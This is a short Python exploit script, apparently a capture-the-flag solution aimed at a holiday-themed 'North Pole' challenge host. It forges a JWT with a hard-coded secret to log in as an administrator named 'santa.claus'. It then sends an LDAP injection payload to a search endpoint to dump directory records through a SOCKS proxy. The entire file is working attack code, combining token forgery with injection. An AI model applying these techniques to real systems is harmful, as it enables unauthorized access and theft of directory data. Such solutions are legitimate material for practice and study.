#!/usr/bin/env python3
import requests
import sys
import jwt
import json

SECRET_KEY='3lv3s'
PROXY = "socks5h://localhost:32080"

class EDB:
    def __init__(self, host='http://edb.northpolechristmastown.com'):
        self.host = host
        ses = requests.session()
        ses.proxies = {
            "http": PROXY,
        }
        self.ses = ses

    def make_jwt(self, user, dept="administrators", ou="human"):
        data = {
            'uid': user,
            'dept': dept,
            'ou': ou,
            'expires': '2018-08-16 12:00:47.248093+00:00',
        }

        token = jwt.encode(data, key=SECRET_KEY)
        return token.decode('utf-8')

    def login(self, user):
        token = self.make_jwt(user)
        self.ses.headers['np-auth'] = token
        resp = self.ses.post(self.host + "/login", data={
            "auth_token": token
        })
        resp.raise_for_status()
        #print(resp.text)
        resp = self.ses.get(self.host + "/home.html")
        resp.raise_for_status()

    def ldap_search(self, query):
        resp = self.ses.post(self.host + "/search", data={
            "isElf": "True",
            "attributes": "*",
            "name": query,
        })
        resp.raise_for_status()
        return resp.json()

if __name__ == "__main__":
    db = EDB()
    db.login("santa.claus")
    all_data = db.ldap_search("name=))(department=it)(|(cn=")
    print(json.dumps(all_data, indent=True))
